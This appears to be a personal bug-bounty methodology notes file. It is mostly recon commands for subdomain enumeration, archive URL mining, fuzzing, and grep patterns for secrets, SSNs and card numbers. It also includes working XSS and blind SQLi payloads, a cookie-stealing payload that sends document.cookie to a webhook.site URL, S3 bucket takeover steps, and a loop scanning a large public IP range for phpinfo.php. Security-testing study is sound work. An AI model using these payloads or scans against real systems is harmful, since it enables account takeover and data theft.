`');});//]]></script>` This part is used to close the tags in the reflected area. It will be different in every case, and what people will keep doing is , copying these payloads blindly without even 5 min manual analysis of what is going on behind the scene. **That's why blindly throwing payloads and fuzzing with burp intruder might be a waste of time if you don't know what you are doing and why.**


`<!--` Commented the actual code that was supposed to render and execute. We commented, which instructed the browser to ignore the actual one and instead execute a prompt() as a malicious one.

**Note:** If general functions like `alert()` and `prompt()` fail, try `print()`.

_If you want to weaponize XSS from a real attacker's mindset, refer to this

> https://github.com/hakluke/weaponised-XSS-payloads

---

#OneLiners

> https://github.com/dwisiswant0/awesome-oneliner-bugbounty

#subdomain_collections

Tool: https://github.com/coffinxp/loxs

```bash
- Basic Subdomain Discovery
bbot -d target.com
subfinder -d example.com -all -recursive > subexample.com.txt
assetfinder --subs-only target.com >> subexample.com.txt
amass enum -passive -d target.com >> subexample.com.txt

#Find Subdomains of Subdomains

./altdns.py -i subdomains.txt -o data_output -w words.txt -r -s output.txt
#or
./subbrute.py -t list.txt
#Grab every .txt file and deduplicate them.
cat *.txt |  sort -u recon.txt > final-subs.txt

#If you want to be extra cautious and avoid picking up files like `final-subs.txt` itself (if rerunning the script), you could filter explicitly:
cat $(ls *.txt | grep -v '^final-subs.txt$') | sort -u > final-subs.txt
#That excludes `final-subs.txt` from the input list.

- Live Subdomain Filtering
cat subexample.com.txt | httpx-toolkit  -status-code -title -tech-detect -silent -ports 80,443,8080,8000,8888 -threads 200 > subexample.coms_alive.txt

# ! After having the live host, you can filter for the ".js" files and manually inspect them:

curl -s https://www.domain.com/static/main.js | less
#Expect something like this:
const config = {  
apiKey: "AKIAXXXXXXXEXAMPLEKEY123",  
 data=91173hsbakexampledata  
}

#Wayback Recon
waymore -i domain.com -mode U -oU waymore_domain.com.txt

 cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

#I used below linux command to match similarly that we were doing using google dorking, only long urls

cat waymore_domain.com.txt | grep "=" | grep "&" | grep "?"

# Tip: if you find this type of url which is meant for internal usage:

> #https://api.target.com/export?type=pdf&type=../../../../etc/passwd

#Try to FUZZ  it up and see if it leaks internal info with curl:

ffuf -u https://api-dev.targetcompany.com/api/v1/internal/FUZZ -w wordlist.txt -mc 200,403,500 -ac

#curl:  (writeUp by https://freedium.cfd/https://medium.com/bugbountywriteup/404-to-0wnage-how-a-broken-api-route-unlocked-production-secrets-cc8ec9c6d063)

curl https://api-dev.targetcompany.com/api/v1/internal/secrets


#Automated parameters discovery, which you can filter out later:

python3 paramspider.py -d target.com --level high -o params.txt
arjun -u https://target.com/api -m GET -o params.json

# Automated XSS Scanning: 

cat params.txt | dalfox pipe -o xss_results.txt
python3 XSSStrike/xsstrike.py -u "https://target.com/index.php?search=query"

# Automated SSRF Scanning:

python3 gopherus.py
interactsh-client -v  #Interactsh is commonly used to detect **out-of-band (OOB)** interactions, such as DNS or HTTP callbacks, during security testing—helpful for validating SSRF, RCE, XSS, etc.

#find exposed admin panels that don’t require authentication:

whatweb -i  subexample.coms_alive.txt | grep -i "admin\|dashboard\|login"

You can find many platforms like:
- Jenkins
- Kibana
- Prometheus
- Webmin
- phpMyAdmin

#Grab Low Hunging Fruits:
- Subdomain Takeover Check
subzy run --targets subexample.coms.txt --concurrency 100 --hide_fails --verify_ssl
- Look for and broken links
socialhunter -f alive.t

#While everything is running, do github Recon or Dork like a Pro:
site:target.com ext:sql 
site:target.com inurl:admin 
site:target.com filetype:php,aspx,wsdl,swf (Shockwave Flash)
site:target.com ext:bak etc..
site:target.com "api_key"
inurl:search.php inurl:sqlQuery inurl:&
site:domain.com "join.slack" ext:docx 
odt,odf,csv,xls,xlsx,txt....


# Nuclei template for takeovers:  
nuclei -t ~/nuclei-templates/takeovers/ -l live_subs.txt  

# plus, use masscan/naabu as a nmap alternative:

masscan $ip$ -p-   tool--> github.com/robertdavidgraham/masscan

#Example Command:

> masscan -p1-65535 192.168.1.0/24 --rate=1000 -e eth0 -oG masscan.txt

 #Scan massive ip rage searching for phpinfo.php
 
#!/bin/bash
for ipa in 98.13{6..9}.{0..255}.{0..255}; do
  wget -t 1 -T 5 http://${ipa}/phpinfo.php;
done&


```



Eagle Eye (OSINT Tool, $99 one-time), Spyse ($50/month)

_**Why I bought it?**_ Automates LinkedIn/GitHub employee searches for credential leaks.

**"Should You Buy Paid Tools?"**

- If you're starting: Stick with free tools + manual creativity.
- If you're earning bounties: Invest in Burp Pro + Censys — they pay for themselves.

```bash
function wayback() {
    curl -sk "http://web.archive.org/cdx/search/cdx?url=*.${1}&output=txt&fl=original&collapse=urlkey&page=" | 
    awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u
}

#This function queries the WBM for historical URLs that contain subdomains of the target you pass in. It extracts those subdomains and deduplicates them.
```

### Certificate Transparency Logs

Every time a certificate is issued for a domain, it's logged publicly. Tools like **crt.sh** and **CertSpotter** let you extract subdomains, including **staging sites, internal tools, and deprecated environments** that still have vulnerabilities.


```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

**Automate** this step on a **daily** basis to capture **newly** issued certs.

Use **ctfr** (Certificate Transparency Fast Recon) to extract subdomains _and_ associated email addresses from SSL certs:

```typescript
python3 ctfr.py -d target.com -o subs.txt
```


## Check for Exposed `.git` Directories (low Hanging Fruit)

```bash
curl -s -o /dev/null -w "%{http_code}" https://target.com/.git/config
```

If the HTTP response code is `200`, the repository is exposed.

## Dump Repository Content

```bash
git clone --mirror https://target.com/.git
```

This allows retrieval of sensitive data such as database credentials or internal APIs.

## Exploiting Debug Panels

- **Laravel Debug Mode:**

```
curl -I https://target.com/.env
```

If successful, this might reveal database credentials.

- **Flask Debug Mode:** Check for exposed Werkzeug Debugger:

> https://target.com/console

————————————————————————————————————

_Find subdomains others miss by brute-forcing permutations. **Tools**: `Amass`, `altdns`, `httpx`

```bash
# Step 1: Passive enumeration with Amass  
amass enum -passive -d target.com -o subs.txt  

# Step 2: Generate permutations (e.g., dev-api → api-dev, beta-api)  
altdns -i subs.txt -o permutations.txt -w ~/bugbounty/wordlists/altdns_words.txt  

# Step 3: Resolve live subdomains  
httpx -l permutations.txt -silent -o live_subs.txt  
```

**Bug found:** Found `dev-admin.target.com` — Unauthenticated dashboard

————————————————————————————————————

### Waybackurls + GF Patterns for Hidden Endpoints

Extract URLs with vulnerable parameters from archived data. **Tools**: `waybackurls`, `gf`, `uro` (for deduplication).

```bash
# Step 1: Fetch historical URLs  
waybackurls target.com > urls.txt  

# Step 2: Filter for SSRF/XSS patterns  
cat urls.txt | gf ssrf | uro > ssrf_urls.txt  
cat urls.txt | gf xss | uro > xss_urls.txt  

# Step 3: Test live endpoints  
httpx -l ssrf_urls.txt -status-code -title -tech-detect  
```

**Bug found:** Found `redirect.php?url=//attacker.com` — Open redirect

————————————————————————————————————
### GitHub Dorking for API Keys

Find secrets in public repos using GitHub search operators. **Tools**: Manual search + `truffleHog`

```ruby
# Manual search on GitHub:  
"target.com" AND ("api_key" OR "secret" OR "password")  

# Automated secret scanning:  
trufflehog git https://github.com/target/repo/ --json | jq  
```

**Bug found:** Found AWS keys in a `.env` file

————————————————————————————————————

### Parameter Mining with Arjun

Discover hidden HTTP parameters. **Tools**: `Arjun`, `ParamSpider`.

```bash
# Run Arjun with a custom wordlist:  
arjun -u https://target.com/login -w ~/wordlists/params.txt -o params.json  

# ParamSpider automation:  
python3 paramspider.py -d target.com --exclude png,jpg  
```

**Possible Bug:** `?debug=true` can expose user session cookies

————————————————————————————————————

### S3 Bucket Hunting

Find misconfigured AWS buckets. **Tools**: `s3scanner`, AWS CLI.

```bash
# Step 1: Brute-force bucket names  
s3scanner scan -t 50 --region us-west-1 --bucket-wordlist common_buckets.txt  

# Step 2: Check permissions  
aws s3 ls s3://bucketname --no-sign-request  
aws s3 cp s3://bucketname/config.yml . --no-sign-request  
```

**Bug found:** Found an open bucket with user data

## S3 Bucket TakeOver:

1. **Find an interseting CNAME**: `files.example.com` → `files.example.com.s3.amazonaws.com`.
2. **Check if the bucket exists**:

```bash
aws s3 ls s3://files.example.com
```

If you see `NoSuchBucket`, proceed.

**3. Create the bucket and upload a PoC**:

```bash
aws s3 mb s3://files.example.com - region us-east-1 
echo "Hacked by <yourname>" > index.html 
aws s3 cp index.html s3://files.example.com - acl public-read
```

**4. Verify**: Visit `http://files.example.com`. If you see your message, then you've successfully found a valid bounty earning bug.

### Other Advanced Methods

#### 1. DNS Zone Transfers (AXFR Abuse)

```css
dig axfr @ns1.example.com example.com
```

If successful, you'll get a full list of subdomains. Look for CNAMEs pointing to dead services.

#### 4. Multi-Hop Takeovers

**Example**:

1. `a.example.com` → `b.herokuapp.com` (dead).
2. `b.herokuapp.com` → `c.s3.amazonaws.com` (dead).

**Chain Reaction**: Claim `c.s3.amazonaws.com`, which then controls `b.herokuapp.com`, which controls `a.example.com`.

————————————————————————————————————

Blind SQL Injection

Tips: 
1. Gather all urls from gau/waybackurls and Google Dorking. 
2. Inject SQLi payload in all parameters one by one. 
3. Analyze the response. 

Payload used: 

```sql
0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z
```

>bbot -d target.com


```bash
subfinder -dL domainlist1.txt | dnsx | shuf | (gau | | hakrawler) | anew | egrep -iv "\.(jpg|jpeg|gif|tif|tiff|png|ttf|woff|woff2|php|ico|pdf|svg|txt|js)$" | urless | nilo | dalfox pipe -b https://xss.hunter

or

amass enum -d atg.se -o domains-amass.atg.se.txt -timeout 12 -v

```

### how to install tools:


![[Pasted image 20241122063448.png]]

or do  "toolname"  and wait for kali to ask if u want to install it


**! Tip: After collecting the subdomains, first, I filter subdomains without WAF and then proceed. Recon commands step-by-step for beginners⬇️**

## GhostFilter: Automating URL Filtering for Smarter Bug Hunting

_automates  filtering process_

- **Lightning-Fast Filtering**: Built with Go, GhostFilter processes large datasets in seconds.
- **Customizable Filtering**: Allows you to define keywords, patterns, or extensions for precise filtering.
- **Integrates with Bug Hunting Tools**: Can be used alongside your favorite reconnaissance tools for seamless workflows.

1. **Installation**

_Make sure you have go install in your linux environment:_

go install github.com/ghost-man01/GhostFilter@latest

OR you can install using GitHub Repository

```bash
git clone https://github.com/siddhant-shukla/GhostFilter.git  
cd GhostFilter  
go build  
./GhostFilter --help
```

**2. Usage**

Using GhostFilter is straightforward. Below are some common use cases:

- **Filter by Keyword**:  
    If you want to filter URLs containing sensitive terms like “admin” or “config,” run:

```bash
./GhostFilter -i input.txt -o output.txt -k keywords.txt
```

**3. Real-World Scenario**

While hunting on a public bug bounty program, I analyzed over 10,000 URLs generated by a web crawler. Using **GhostFilter**, I efficiently filtered URLs containing `/v1/` and `/api/`. Among these, I discovered a hidden endpoint with a form vulnerable to **Cross-Site Scripting (XSS)**. This streamlined approach saved time and allowed me to pinpoint a critical issue quickly, showcasing the tool’s effectiveness in real-world scenarios.

repo: https://github.com/ghost-man01/GhostFilter

### **Filtering live hosts with httpx🚨**

```bash
cat subs_domain.com.txt | httpx -td -title -sc -ip > httpx_domain.com.txt cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt
```

- `-td`: Technology Detection
- `-title`: Extracts the HTML `<title>` from the response for each subdomain. This is useful for identifying what services might be running on each host.
- `-sc`: Prints the HTTP status code, making it easy to spot potential points of interest like 200 (OK) or 403 (Forbidden).
- `-ip`: Displays the IP address for each subdomain.
### **Nuclei Automated Live Subdomains Spray (with rate limit)🔨**

```bash
nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium
```

- `-l live_subs_domain.com.txt`: Specifies the input file containing the live subdomains.
- `-rl 10`: Limits the rate of requests to 10 per second. This is essential to avoid overwhelming the target server, which could lead to rate-limiting or even being blocked.
- `-bs 2`: maximum number of hosts to be analyzed in parallel per template(default is 25)
- `-c 2`: maximum number of templates to be executed in parallel (default is 25)
- `-as`: Automatic web scan using wappalyzer technology detection to tags mapping
- `-silent`: Removes extra output from the terminal, leaving only critical information.
- `-s critical,high,medium`: Tells Nuclei to scan only for critical, high, and medium severity vulnerabilities, which helps you focus on the most important findings

These nuclei options are important as it helps to rate limit the number of requests thrown to the server at every second, which will help upto some extent to prevent from getting blocked easily and unresponsive target skipped problems of nuclei.

### **Finding WAF**

```bash
cat httpx_domain.com.txt | grep 403
```

Some of the common WAFs used by reputed companies are

```
Amazon Cloudfront
Cloudflare
Imperva
Akamai kona site defender
F5 Advanced WAF
Barracuda Web Application Firewall
Fortinet FortiWeb
Microsoft Azure Web Application Firewall
Radware AppWall
Sucuri WAF
```

### **Subdomains without WAF✅**

After identifying live subdomains and their corresponding WAFs, the next step is to filter out subdomains that aren't protected by a Web Application Firewall (WAF). This helps focus on potentially weaker targets.

```bash
cat httpx_domain.com.txt | grep -v -i -E 'cloudfront|imperva|cloudflare' > nowaf_subs_domain.com.txt
```

### **Visit All Non-WAF Subdomains Manually**

Next, you can visit these subdomains manually to look for interesting responses. For example, a `403 Forbidden` response may suggest the existence of restricted areas or resources that could be valuable to investigate further. 

```bash
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'
```

	Find restricted areas with potentially No WAF.

To streamline this process, I recommend using a browser extension like **[Open Multiple URLs](https://chromewebstore.google.com/detail/open-multiple-urls/oifijhaokejakekmnjmphonojcfkpbbh?hl=en&pli=1)**, which lets you open several subdomains simultaneously in different tabs for quicker manual investigation.

### **Prepare the List of 403 Subdomains for Fuzzing**

Once you've identified subdomains returning a `403 Forbidden` response, prepare them for further fuzzing. Fuzzing can help uncover hidden files, directories, or misconfigurations.

```bash
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt
```

### **403 Fuzzing🔍**

When you encounter a `403 Forbidden` response, it usually means that access to a specific resource or endpoint is restricted. While it might seem like a dead end at first, this restriction can actually signal that valuable information is being protected—whether it's sensitive files, hidden directories, or misconfigured security rules.Here's why fuzzing these `403 Forbidden` subdomains is crucial.

_Default Wordlist Fuzzing_

```bash
dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent
```

_Extension based Fuzzing_

```bash
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent
```

One of the good wordlists resource is below.

> https://wordlists-cdn.assetnote.io/data/

![None](https://miro.medium.com/v2/resize:fit:700/1*IDnCMhYRTMZZPBrwvHeWfw.png)

### **Finding Public Exploits💣**

After identifying potential vulnerabilities in a specific subdomain, the next step is to search for public exploits that could be leveraged. **For example, if you discover a vulnerable version of Apache Tomcat, use Google dorks to search for exploit proof-of-concept (PoC) scripts:**

> apache tomcat 9.0.82 exploit poc site:github.com

Would suggest to watch the complete video why we are searching for apache tomcat exploits here!

### **Chatgpt exploit assistance🤖**

![None](https://miro.medium.com/v2/resize:fit:700/1*t3iwtMPai85Dfdtc6PVw0w.png)

### **Finding Appropriate Wordlists📗**

When fuzzing specific services like Apache Tomcat, using targeted wordlists can significantly improve your chances of finding hidden vulnerabilities. You can search for wordlists specific to the server you're targeting, such as Apache Tomcat, with the following commands:

```bash
sudo apt install seclists
cd /usr/share/seclists/Discovery/Web-Content 
ls | grep -i apache
```

To see how many entries are in a specific wordlist, run:

```bash
cat ApacheTomcat.fuzz.txt | wc -l
```

### **Apache Tomcat Fuzzing🐱**

Once you've found the appropriate wordlist, use it to fuzz the Apache Tomcat server for hidden files, misconfigurations, or vulnerable endpoints:

```bash
dirsearch -u https://sub2.sub1.domain.com -x 403,404,500,400,502,503,429 -w /usr/share/seclists/Discovery/Web-Content/ApacheTomcat.fuzz.txt
```

### **Extension Based Fuzzing**

Fuzzing for different file extensions can help uncover sensitive files like backups, configuration files, or database dumps. Use dirsearch for this purpose as well:

```vb
dirsearch -u https://sub2.sub1.domain.com -x 403,404,500,400,502,503,429 -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -w /usr/share/seclists/Discovery/Web-Content/ApacheTomcat.fuzz.txt

```

### **Finding Hidden Database Files💎**

Another valuable source of information is hidden database files. You can search for wordlists that specifically target database file extensions using Google dorks or community-sourced wordlists.

![None](https://miro.medium.com/v2/resize:fit:700/1*FRsomGYxG80qzw6NitsKYQ.png)


```bash
mkdir db_wordlists cd db_wordlists wget https://raw.githubusercontent.com/dkcyberz/Harpy/refs/heads/main/Hidden/database.txt dirsearch -u https://sub2.sub1.domain.com -x 403,404,500,400,502,503,429 -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -w /path/to/wordlists/database.txt
```

## Part 2 LegionHunter Methodology:

> waymore -i domain.com -mode U -oU waymore_domain.com.txt

- `waymore` is used to gather archived URLs from sources like Wayback Machine(web.archive.org) , common crawl(index.commoncrawl.org), alien vault OTX(otx.alienvault.com), URLScan (urlscan.io), virus total(virustotal.com)
- `-i domain.com` specifies `domain.com` as the target domain.
- `-mode U` retrieve URLs only without downloading response
- `-oU waymore_domain.com.txt` saves the unique URLs to output file `waymore_domain.com.txt`

If `waymore` is functioning properly, there is no need to run the following command.

```bash
waybackurls domain.com > wayback_domain.com.txt
```

### **Archive DeepHunt📦**

Below is a mini helper script that I use to refine the URLs and assist in my manual URL analysis.


```python
import os
from colorama import Fore, Style, init

# Initialize colorama for Windows support
init(autoreset=True)

def display_banner():
    # ASCII art in purple
    banner = r"""
     _                          _       __                                  
    /.\      _ ___    ____     FJ___    LJ  _    _   ____                   
   //_\\    J '__ ", F ___J.  J  __ `.     J |  | L F __ J                  
  / ___ \   | |__|-J| |---LJ  | |--| |  FJ J J  F L| _____J                 
 / L___J \  F L  `-'F L___--. F L  J J J  LJ\ \/ /FF L___--.                
J__L   J__LJ__L    J\______/FJ__L  J__LJ__L \\__//J\______/F                
|__L   J__||__L     J______F |__L  J__||__|  \__/  J______F                 
   ___                                    _  _                         _    
  F __".    ____      ____     _ ___     FJ  L]    _    _    _ ___    FJ_   
 J |--\ L  F __ J    F __ J   J '__ J   J |__| L  J |  | L  J '__ J  J  _|  
 | |  J | | _____J  | _____J  | |--| |  |  __  |  | |  | |  | |__| | | |-'  
 F L__J | F L___--. F L___--. F L__J J  F L__J J  F L__J J  F L  J J F |__-.
J______/FJ\______/FJ\______/FJ  _____/LJ__L  J__LJ\____,__LJ__L  J__L\_____
|______F  J______F  J______F |_J_____F |__L  J__| J____,__F|__L  J__|J_____F
                             L_J                                             
    """
    # Print the banner in purple
    print(Fore.MAGENTA + banner)
    # Print the "Script by LegionHunter" in green
    print(Fore.GREEN + "Script by LegionHunter\n" + Style.RESET_ALL)

def get_unique_extensions(filename):
    extensions = set()  # Use a set to avoid duplicates
    with open(filename, 'r') as file:
        for line in file:
            # Strip the line of any whitespace characters
            url = line.strip()
            # Split URL into path and get the extension if present
            path = os.path.splitext(url)[1]
            if path:  # Add non-empty extensions
                extensions.add(path)

    # Print the unique extensions found
    print("Unique Extensions:")
    for ext in sorted(extensions):
        print(ext)

# Display banner
display_banner()

# Example usage
filename = input("Enter the filename of waybackurls output: ")
get_unique_extensions(filename)
```


### **JUICY PATTERN FINDING🤑**

Below regexes tries to declutter stuff, doesn't imply it's 100% accurate.

_**UUID**__🆔_

A UUID (Universally Unique Identifier) is a 128-bit unique identifier used for resources like user accounts or records. **Extracting UUIDs during bug hunting helps identify sensitive resources, which can lead to vulnerabilities like IDOR** (Insecure Direct Object Reference) or access control flaws. Finding UUIDs can also expose hidden or deprecated endpoints for further analysis.

```bash
grep -Eo '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}' wayback_domain.com.txt | sort -u
```

_**JWT**_ _(Json Web Token)_💰

A JWT (JSON Web Token) is a compact, URL-safe token that represents claims transferred between two parties, consisting of a header, payload, and signature. _Extracting JWT tokens in bug hunting is vital because they often contain sensitive information about user identities and permissions, which can lead to potential unauthorized access._

**Additionally, JWTs may contain excessive information that can be exploited, such as user roles or scopes, allowing attackers to manipulate claims and escalate privileges.**

```bash
cat wayback_domain.com.txt | grep "eyJ"
```

_jwt.io_

![None](https://miro.medium.com/v2/resize:fit:700/1*beGS_inxpIH7b4iyDFscUA.png)

_**Any suspicious keyword/path/number**__👻_

```bash
grep -Eo '([a-zA-Z0-9_-]{20,})' wayback_domain.com.txt
```

_**SSN (Social Security Number)**__🔢_

```bash
grep -Eo '\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b' wayback_domain.com.txt
```

_**Credit Card Numbers**__💳_

```bash
grep -Eo '\b[0-9]{13,16}\b' wayback_domain.com.txt
```

_**Potential SessionIDs and cookies**_

```bash
grep -Eo '[a-zA-Z0-9]{32,}' wayback_domain.com.txt
```

_**Tokens + Secrets**_

```bash
cat wayback_domain.com.txt | grep "token"
cat wayback_domain.com.txt | grep "token="
cat wayback_domain.com.txt | grep "code"
cat wayback_domain.com.txt | grep "code="
cat wayback_domain.com.txt | grep "secret"
cat wayback_domain.com.txt | grep "secret="
```

_**Others**_

```bash
cat wayback_domain.com.txt | grep "admin"
cat wayback_domain.com.txt | grep "pass"
cat wayback_domain.com.txt | grep "pwd"
cat wayback_domain.com.txt | grep "passwd"
cat wayback_domain.com.txt | grep "password"

cat wayback_domain.com.txt | grep "phone"
cat wayback_domain.com.txt | grep "mobile"
cat wayback_domain.com.txt | grep "number"

cat wayback_domain.com.txt | grep "mail"
```

_**Private IP Address**_🚨

Identifying private IP addresses is essential for uncovering hidden internal services that could be vulnerable to exploitation. It can reveal potential security misconfigurations that expose sensitive data or systems to unauthorized access. Furthermore, this information assists in mapping out the internal network.

```bash
grep -Eo '((10|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3})' wayback_domain.com.txt
```

_**IPv4**__🟢_

```bash
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' wayback_domain.com.txt
```

_**IPv6**__🔴_

```bash
grep -Eo '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' wayback_domain.com.txt
```

_**Payment**__💸_

```bash
grep "payment" wayback_domain.com.txt
grep "order" wayback_domain.com.txt
grep "orderid" wayback_domain.com.txt
grep "payid" wayback_domain.com.txt
grep "invoice" wayback_domain.com.txt
grep "pay" wayback_domain.com.txt
```

_**API Endpoint**__👾_

```bash
grep "/api/" wayback_domain.com.txt
grep "api." wayback_domain.com.txt
grep "api" wayback_domain.com.txt
grep "/graphql" wayback_domain.com.txt
grep "graphql" wayback_domain.com.txt


# when new API versions are released, developers forget to remove previous ones
# so we go back to previous versions and then exploit them first as more 
# chance to get bug :)
grep "/v1/" wayback_domain.com.txt
grep "/v2/" wayback_domain.com.txt
grep "/v3/" wayback_domain.com.txt
grep "/v4/" wayback_domain.com.txt
grep "/v5/" wayback_domain.com.txt
```

_**Authentication & Authorization**__👮‍♂️_

```bash
cat wayback_domain.com.txt | grep "sso"
cat wayback_domain.com.txt | grep "/sso"
cat wayback_domain.com.txt | grep "saml"
cat wayback_domain.com.txt | grep "/saml"
cat wayback_domain.com.txt | grep "oauth"
cat wayback_domain.com.txt | grep "/oauth"
cat wayback_domain.com.txt | grep "auth"
cat wayback_domain.com.txt | grep "/auth"
cat wayback_domain.com.txt | grep "callback"
cat wayback_domain.com.txt | grep "/callback"
```

Try to identify endpoints related to SSO, SAML, OAuth, and authentication because they are critical for managing user identities and access control.

**These endpoints are often complex and can be misconfigured, leading to vulnerabilities such as unauthorized access or privilege escalation.** 

Specifically, misconfigured SSO or OAuth providers can expose sensitive data and create open redirect vulnerabilities, allowing attackers to redirect users to malicious sites.

### **Information Disclosure via exposed files📂**

![[Pasted image 20250426002311.png]]

```bash
grep -Eo 'https?://[^ ]+\.(env|yaml|yml|json|xml|log|sql|ini|bak|conf|config|db|dbf|tar|gz|backup|swp|old|key|pem|crt|pfx|pdf|xlsx|xls|ppt|pptx)' wayback_domain.com.txt
```

Google Dork:

```json
site:domain.com ext:env OR ext:yaml OR ext:yml OR ext:json OR ext:xml OR ext:zip OR ext:log OR ext:sql OR ext:ini OR ext:bak OR ext:conf OR ext:config OR ext:db OR ext:dbf OR ext:tar OR ext:gz OR ext:backup OR ext:swp OR ext:old OR ext:key OR ext:pem OR ext:crt OR ext:pfx OR ext:pdf OR ext:xlsx OR ext:xls OR ext:ppt OR ext:pptx
```

Manually we need to crawl each file and observe for any sensitive information that is disclosed and where the document is marked as **"_CONFIDENTIAL_" , "_INTERNAL USE ONLY_", "_HIGHLY CONFIDENTIAL_", "_PRIVATE USE ONLY_", etc..**

_PRO TIP_😎

_Convert above english keywords to other languages_

---
#### 🛠️ Using Python for Web Scraping

Python's **BeautifulSoup** and **requests** libraries can be used to extract information from a website.

#### Python Script to Extract All Links from a Web Page

```python
import requests
from bs4 import BeautifulSoup

# Target URL
url = "https://example.com"

# Send request
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")

# Extract and print all links
for link in soup.find_all("a"):
    print(link.get("href"))
```

💡 **Modify this script to extract emails, images, or specific text from web pages.**

#### 📩 Extracting Emails from Websites with theHarvester

Emails can be collected from **public search engines, SSL certificates, and metadata.**

#### Automated Approach: Using theHarvester

```css
theHarvester -d example.com -l 200 -b google
```

This will return **email addresses, subdomains, and linked hosts**.

```bash
wappalyzer https://example.com
```

**BACK-ME-UP** - ~={orange}A tool to automate a bugbounty process as: Tool will execute multiple tools to collect URLs from internet archives then use some useful patterns/RegEx to look for Sensitive Data Leakage in the form of multiple juicy extensions.=~

⭐️⭐️ https://github.com/Dheerajmadhukar/back-me-up


```bash
grep-backURLs - Automated way to extract juicy info with subfinder and waybackurls

https://github.com/gigachad80/grep-backURLs
```


-> check for alive subs (IF YOU'RE NOT HUNTING FOR SUBDOMAIN TAKEOVER)

```shell
cat subdomains.txt | httprobe | tee -a host.txt
```

### Crawling Alive Subdomains 🔄

Use **Katana** to crawl the live subdomains and gather additional endpoints for further analysis:

```typescript
katana -list alive_subdomains.txt -o endpoints.txt
```

### 5. Screenshotting 📸

Visualizing your findings helps you identify interesting targets. Use **Eyewitness** to capture screenshots:

```css
eyewitness --web -f alive_subdomains.txt --threads 5 -d screenshots/
```

![[Pasted image 20250414202746.png]]

--- After Gathered subs

One subdomain I found was **jp.redacted.com**.

Next, I utilized ==Param Spider== to gather all possible parameters. The command I used was:


```bash
paramspider -d jp.redacted.com -s  (to list in the terminal all possible parameters0
```

This command listed all possible parameters in the terminal. Among them, I discovered a parameter called **s=**, which allowed me to execute reflected XSS (RXSS) with a simple payload:

```html
<script>alert(1)</script> or try: <script/src=//Ǌ.₨></script>
```

or simple HTMLi:

```html
<a href="https://Google.com">Login Here</a>

or

<h3><mark><a href="https://example.com">e x a m p l e . c o m</a></mark></h3>

The exploit URL for this may look like: https://www.nasa.gov/? search=%3Ca+href%3D%22https%3A%2F%2FGoogle.com%22%3E+Login+Here%3C%2Fa%3E
```

![None](https://miro.medium.com/v2/resize:fit:700/1*I8ZS_Y9jQPRh6tgLJle3fw.gif)

![](https://miro.medium.com/v2/resize:fit:700/1*RoZet6wDPJj_WVBnv9x3iQ.png)

						RXSS


Once I got I tried to escalate it to the ATO using a simple payload

```html
<img src="x" onerror=document.location=%27https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=%27+document.cookie;">

#if it dosen't work, try with null byte injection or base64 encode
```

### Finding XSS Vulnerabilities 🔧

#blind_xss 


```bash
paramspider -d target.com | qsreplace '"/><script>confirm(1)</script>' > xss.txt  


cat xss.txt | while read url; do curl --silent --path-as-is --insecure "$url" | grep -qs "<script>confirm(1)" && echo "$url \\033[0;31mVulnerable\\n" || echo "$url \\033[0;32mNot Vulnerable\\n"; done
```

> repo: https://github.com/devanshbatham/ParamSpider

![[Pasted image 20250414202923.png]]

![[Pasted image 20250312185451.png]]



With so many endpoints, I used **qsreplace** to fuzz for XSS vulnerabilities. Here's the command:

```bash
cat endpoint.txt | qsreplace '"<img src=x onerror=alert(1)>' | tee -a xss_fuzz.txt
```

To check which parameters reflected the payload, use a tool called **FREQ**. This tool sends multiple requests and identifies URLs reflecting the payload:

```bash
cat xss_fuzz.txt | freq | tee -a possible_xss.txt
```

**or try to use:**

> echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt


Once you run the command, you’ll get a list of URLs with reflected parameters that could be susceptible to XSS. The next step is to refine and validate the results to reduce noise and focus on real vulnerabilities.

# Refining the Results

To clean up the output and show only URLs with potentially vulnerable parameters, use the following command:

```bash
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```

This command will:

- Extract only the URLs from the output.
- Remove everything after the `=` sign to focus on the parameters.
- Sort the results to ensure they are unique.


# Step 3: Exploiting with Loxs Tool

After refining the list, it’s time to exploit the potential XSS vulnerabilities using the **Loxs** tool.

# How to Use the Loxs Tool

1. Navigate to your Loxs tool folder.
2. Run the tool and select option **4** for XSS testing.
3. Enter the path to your `final.txt` file containing the filtered URLs.
4. Provide the path to your XSS payload file.
5. Hit Enter and let the tool perform the exploitation.

## TEST FOR MORE PARAMS:

## GF:

```bash
cat allurls.txt | gf sqli | sed 's/=.*/=/' | sed 's/URl: //' | sort -u | tee output.txt

```

![None](https://miro.medium.com/v2/resize:fit:700/1*58EgBqZFJsmpDiaqVxbuVQ.png)


## Automate LFI and RFI Detection:

![[Pasted image 20250414203854.png]]

>https://github.com/D35m0nd142/LFISuite/blob/master/README.md

>https://github.com/kurobeats/fimap

![[Pasted image 20250414204117.png]]

![[Pasted image 20250414203317.png]]

## Open Redirect

![[Pasted image 20250414211401.png]]

> https://github.com/r0075h3ll/Oralyzer


![[Pasted image 20250414212321.png]]

